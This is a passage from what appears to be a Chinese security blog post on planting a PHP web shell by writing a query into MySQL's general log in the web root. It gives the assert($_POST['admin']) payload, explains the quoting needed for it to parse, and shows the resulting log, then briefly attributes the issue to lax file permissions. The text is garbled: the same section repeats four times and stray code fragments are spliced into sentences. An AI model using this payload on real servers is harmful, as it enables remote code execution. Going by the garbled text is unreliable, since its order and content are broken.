<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php这边解析的时候就会报错，因此我们采用单引号与双引号公用的方式实现：

</code></pre></div></div>
<p>SELECT ‘&lt;?php assert($_POST[“admin”]);?&gt;’;
PS：$_POST中不用引号也可以~</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
![enter description here](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-0ae649932588d176756a432479ff62cf_r.jpg)

我们访问看看~

![enter description here](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-e5cc5693f6a7e55616cdfa62f605bddc_hd.jpg)

已经解析php了，我们同样测试一下是否能执行php代码吧 ~

![enter description here](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-b13043cfb90de8ac7a55aec067901aad_hd.jpg)

贴出日志内容：

```sql
C:\phpStu\mysql/bin/mysqld.exe, Version: 5.5.53 (MySQL Community Server (GPL)). started with:
TCP Port: 3306, Named Pipe: MySQL
Time                 Id Command    Argument
		   44 Quit	
170323 18\:27\:27	   45 Connect	root@localhost on 
		   45 Query	SET NAMES 'utf8' COLLATE 'utf8_general_ci'
		   45 Init DB	mysql
		   45 Query	SHOW MASTER LOGS
170323 18\:27\:28	   45 Quit	
		   46 Connect	root@localhost on 
		   46 Query	SET NAMES 'utf8' COLLATE 'utf8_general_ci'
		   46 Quit	
170323 18\:28\:01	   47 Connect	root@localhost on 
		   47 Query	SET NAMES 'utf8' COLLATE 'utf8_general_ci'
		   47 Query	SELECT '&lt;?php assert($_POST["admin"]);?&gt;'
		   47 Quit	
</code></pre></div></div>

<h2 id="0x03-总结-5">0x03 总结</h2>

<p>在权限把控不严谨的情况下容易出现此类攻击，如果MySQL没有权限在站点根目录下创建文件的话也就不会发生这样的情况了。</p>

<p>修复方案就是权限把控好就可以了 ~
]);?&gt;;</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
保存到日志中也会变成

</code></pre></div></div>
<p>SELECT ‘&lt;?php assert($_POST[
php这边解析的时候就会报错，因此我们采用单引号与双引号公用的方式实现：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT '&lt;?php assert($_POST["admin"]);?&gt;';
PS：$_POST中不用引号也可以~
</code></pre></div></div>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-0ae649932588d176756a432479ff62cf_r.jpg" alt="enter description here"></p>

<p>我们访问看看~</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-e5cc5693f6a7e55616cdfa62f605bddc_hd.jpg" alt="enter description here"></p>

<p>已经解析php了，我们同样测试一下是否能执行php代码吧 ~</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-b13043cfb90de8ac7a55aec067901aad_hd.jpg" alt="enter description here"></p>

<p>贴出日志内容：</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">phpStu</span><span class="err">\</span><span class="n">mysql</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">mysqld</span><span class="p">.</span><span class="n">exe</span><span class="p">,</span> <span class="k">Version</span><span class="p">:</span> <span class="mi">5</span><span class="p">.</span><span class="mi">5</span><span class="p">.</span><span class="mi">53</span> <span class="p">(</span><span class="n">MySQL</span> <span class="n">Community</span> <span class="n">Server</span> <span class="p">(</span><span class="n">GPL</span><span class="p">)).</span> <span class="n">started</span> <span class="k">with</span><span class="p">:</span>
<span class="n">TCP</span> <span class="n">Port</span><span class="p">:</span> <span class="mi">3306</span><span class="p">,</span> <span class="n">Named</span> <span class="n">Pipe</span><span class="p">:</span> <span class="n">MySQL</span>
<span class="nb">Time</span>                 <span class="n">Id</span> <span class="n">Command</span>    <span class="n">Argument</span>
		   <span class="mi">44</span> <span class="n">Quit</span>	
<span class="mi">170323</span> <span class="mi">18</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">27</span>	   <span class="mi">45</span> <span class="k">Connect</span>	<span class="n">root</span><span class="o">@</span><span class="n">localhost</span> <span class="k">on</span> 
		   <span class="mi">45</span> <span class="n">Query</span>	<span class="k">SET</span> <span class="k">NAMES</span> <span class="s1">'utf8'</span> <span class="k">COLLATE</span> <span class="s1">'utf8_general_ci'</span>
		   <span class="mi">45</span> <span class="n">Init</span> <span class="n">DB</span>	<span class="n">mysql</span>
		   <span class="mi">45</span> <span class="n">Query</span>	<span class="k">SHOW</span> <span class="n">MASTER</span> <span class="n">LOGS</span>
<span class="mi">170323</span> <span class="mi">18</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">28</span>	   <span class="mi">45</span> <span class="n">Quit</span>	
		   <span class="mi">46</span> <span class="k">Connect</span>	<span class="n">root</span><span class="o">@</span><span class="n">localhost</span> <span class="k">on</span> 
		   <span class="mi">46</span> <span class="n">Query</span>	<span class="k">SET</span> <span class="k">NAMES</span> <span class="s1">'utf8'</span> <span class="k">COLLATE</span> <span class="s1">'utf8_general_ci'</span>
		   <span class="mi">46</span> <span class="n">Quit</span>	
<span class="mi">170323</span> <span class="mi">18</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">01</span>	   <span class="mi">47</span> <span class="k">Connect</span>	<span class="n">root</span><span class="o">@</span><span class="n">localhost</span> <span class="k">on</span> 
		   <span class="mi">47</span> <span class="n">Query</span>	<span class="k">SET</span> <span class="k">NAMES</span> <span class="s1">'utf8'</span> <span class="k">COLLATE</span> <span class="s1">'utf8_general_ci'</span>
		   <span class="mi">47</span> <span class="n">Query</span>	<span class="k">SELECT</span> <span class="s1">'&lt;?php assert($_POST["admin"]);?&gt;'</span>
		   <span class="mi">47</span> <span class="n">Quit</span>	
</code></pre></div></div>

<h2 id="0x03-总结-6">0x03 总结</h2>

<p>在权限把控不严谨的情况下容易出现此类攻击，如果MySQL没有权限在站点根目录下创建文件的话也就不会发生这样的情况了。</p>

<p>修复方案就是权限把控好就可以了 ~
admin
php这边解析的时候就会报错，因此我们采用单引号与双引号公用的方式实现：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT '&lt;?php assert($_POST["admin"]);?&gt;';
PS：$_POST中不用引号也可以~
</code></pre></div></div>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-0ae649932588d176756a432479ff62cf_r.jpg" alt="enter description here"></p>

<p>我们访问看看~</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-e5cc5693f6a7e55616cdfa62f605bddc_hd.jpg" alt="enter description here"></p>

<p>已经解析php了，我们同样测试一下是否能执行php代码吧 ~</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-b13043cfb90de8ac7a55aec067901aad_hd.jpg" alt="enter description here"></p>

<p>贴出日志内容：</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">phpStu</span><span class="err">\</span><span class="n">mysql</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">mysqld</span><span class="p">.</span><span class="n">exe</span><span class="p">,</span> <span class="k">Version</span><span class="p">:</span> <span class="mi">5</span><span class="p">.</span><span class="mi">5</span><span class="p">.</span><span class="mi">53</span> <span class="p">(</span><span class="n">MySQL</span> <span class="n">Community</span> <span class="n">Server</span> <span class="p">(</span><span class="n">GPL</span><span class="p">)).</span> <span class="n">started</span> <span class="k">with</span><span class="p">:</span>
<span class="n">TCP</span> <span class="n">Port</span><span class="p">:</span> <span class="mi">3306</span><span class="p">,</span> <span class="n">Named</span> <span class="n">Pipe</span><span class="p">:</span> <span class="n">MySQL</span>
<span class="nb">Time</span>                 <span class="n">Id</span> <span class="n">Command</span>    <span class="n">Argument</span>
		   <span class="mi">44</span> <span class="n">Quit</span>	
<span class="mi">170323</span> <span class="mi">18</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">27</span>	   <span class="mi">45</span> <span class="k">Connect</span>	<span class="n">root</span><span class="o">@</span><span class="n">localhost</span> <span class="k">on</span> 
		   <span class="mi">45</span> <span class="n">Query</span>	<span class="k">SET</span> <span class="k">NAMES</span> <span class="s1">'utf8'</span> <span class="k">COLLATE</span> <span class="s1">'utf8_general_ci'</span>
		   <span class="mi">45</span> <span class="n">Init</span> <span class="n">DB</span>	<span class="n">mysql</span>
		   <span class="mi">45</span> <span class="n">Query</span>	<span class="k">SHOW</span> <span class="n">MASTER</span> <span class="n">LOGS</span>
<span class="mi">170323</span> <span class="mi">18</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">28</span>	   <span class="mi">45</span> <span class="n">Quit</span>	
		   <span class="mi">46</span> <span class="k">Connect</span>	<span class="n">root</span><span class="o">@</span><span class="n">localhost</span> <span class="k">on</span> 
		   <span class="mi">46</span> <span class="n">Query</span>	<span class="k">SET</span> <span class="k">NAMES</span> <span class="s1">'utf8'</span> <span class="k">COLLATE</span> <span class="s1">'utf8_general_ci'</span>
		   <span class="mi">46</span> <span class="n">Quit</span>	
<span class="mi">170323</span> <span class="mi">18</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">01</span>	   <span class="mi">47</span> <span class="k">Connect</span>	<span class="n">root</span><span class="o">@</span><span class="n">localhost</span> <span class="k">on</span> 
		   <span class="mi">47</span> <span class="n">Query</span>	<span class="k">SET</span> <span class="k">NAMES</span> <span class="s1">'utf8'</span> <span class="k">COLLATE</span> <span class="s1">'utf8_general_ci'</span>
		   <span class="mi">47</span> <span class="n">Query</span>	<span class="k">SELECT</span> <span class="s1">'&lt;?php assert($_POST["admin"]);?&gt;'</span>
		   <span class="mi">47</span> <span class="n">Quit</span>	
</code></pre></div></div>

<h2 id="0x03-总结-7">0x03 总结</h2>

<p>在权限把控不严谨的情况下容易出现此类攻击，如果MySQL没有权限在站点根目录下创建文件的话也就不会发生这样的情况了。</p>

<p>修复方案就是权限把控好就可以了 ~
]);?&gt;’;</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php这边解析的时候就会报错，因此我们采用单引号与双引号公用的方式实现：

</code></pre></div></div>
<p>SELECT ‘&lt;?php assert($_POST[“admin”]);?&gt;’;
PS：$_POST中不用引号也可以~</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
![enter description here](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-0ae649932588d176756a432479ff62cf_r.jpg)

我们访问看看~

![enter description here](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-e5cc5693f6a7e55616cdfa62f605bddc_hd.jpg)

已经解析php了，我们同样测试一下是否能执行php代码吧 ~

![enter description here](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-2/v2-b13043cfb90de8ac7a55aec067901aad_hd.jpg)

贴出日志内容：

```sql
C:\phpStu\mysql/bin/mysqld.exe, Version: 5.5.53 (MySQL Community Server (GPL)). started with:
TCP Port: 3306, Named Pipe: MySQL
Time                 Id Command    Argument
		   44 Quit	
170323 18\:27\:27	   45 Connect	root@localhost on 
		   45 Query	SET NAMES 'utf8' COLLATE 'utf8_general_ci'
		   45 Init DB	mysql
		   45 Query	SHOW MASTER LOGS
170323 18\:27\:28	   45 Quit	
		   46 Connect	root@localhost on 
		   46 Query	SET NAMES 'utf8' COLLATE 'utf8_general_ci'
		   46 Quit	
170323 18\:28\:01	   47 Connect	root@localhost on 
		   47 Query	SET NAMES 'utf8' COLLATE 'utf8_general_ci'
		   47 Query	SELECT '&lt;?php assert($_POST["admin"]);?&gt;'
		   47 Quit	
</code></pre></div></div>

<h2 id="0x03-总结-8">0x03 总结</h2>

<p>在权限把控不严谨的情况下容易出现此类攻击，如果MySQL没有权限在站点根目录下创建文件的话也就不会发生这样的情况了。</p>

<p>修复方案就是权限把控好就可以了 ~</p>

  </article>
  
  




</div>

        </div>
        <div class="col-second">
          <div class="col-box col-box-author">
  <img class="avatar" src="//avatars0.githubusercontent.com/u/19944759?s=150&v=4" alt="倾旋">
  <div class="col-box-title name">倾旋</div>
  <p>特点：爪子长、个子高、身体瘦弱
</p>
  <p class="contact">
    
    <a href="https://github.com/Rvn0xsy">GitHub</a>
    
    
    <a href="https://twitter.com/Rvn0xsy">Twitter</a>
    
    
    <a href="mailto:rvn0xsy@gmail.com">Email</a>
    
    <a href="#">微信</a>
    
  </p>
</div>

<div class="col-box">
  <div class="col-box-title">Newest Posts</div>
  <ul class="post-list">
    
      <li><a class="post-link" href="/archivers/2021-02-18/1">Pricking 项目（一） ：使用介绍</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-18/2">Pricking 项目（二） ：JS模块开发</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-16/1">红队技巧：基于反向代理的水坑攻击</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-09/1">CVE-2021-3156 - Exploit修改</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-08/1">静态恶意代码逃逸（第十课）</a></li>
    
      <li><a class="post-link" href="/archivers/2021-01-31/1">Windows权限控制相关的防御与攻击技术</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-29/2">静态恶意代码逃逸（第九课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-29/1">静态恶意代码逃逸（第八课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-13/1">Linux透明代理在红队渗透中的应用</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-01/1">Web正向代理的思考</a></li>
    
      <li><a class="post-link" href="/archivers/2020-10-23/1">静态恶意代码逃逸（第七课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-08-24/1">这是一个充满挑战的好时代</a></li>
    
      <li><a class="post-link" href="/archivers/2020-07-16/1">通过OXID解析器获取Windows远程主机上网卡地址</a></li>
    
      <li><a class="post-link" href="/archivers/2020-06-28/1">如何实现一个Atexec</a></li>
    
      <li><a class="post-link" href="/archivers/2020-04-02/1">如何实现一个Psexec</a></li>
    
    <li><a class="post-link" href="/posts/">更多....</a></li>
  </ul>
</div>

<div class="col-box post-toc hide">
  <div class="col-box-title">TOC</div>
</div>

        </div>
      </div>
    </div>

    <footer class="footer">
<div class="wrapper">
© 2021 倾旋
</div>
</footer>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-158746438-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-158746438-1');
</script>

<script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});</script>
<script src="/js/easybook.js"></script>


  </body>

</html>
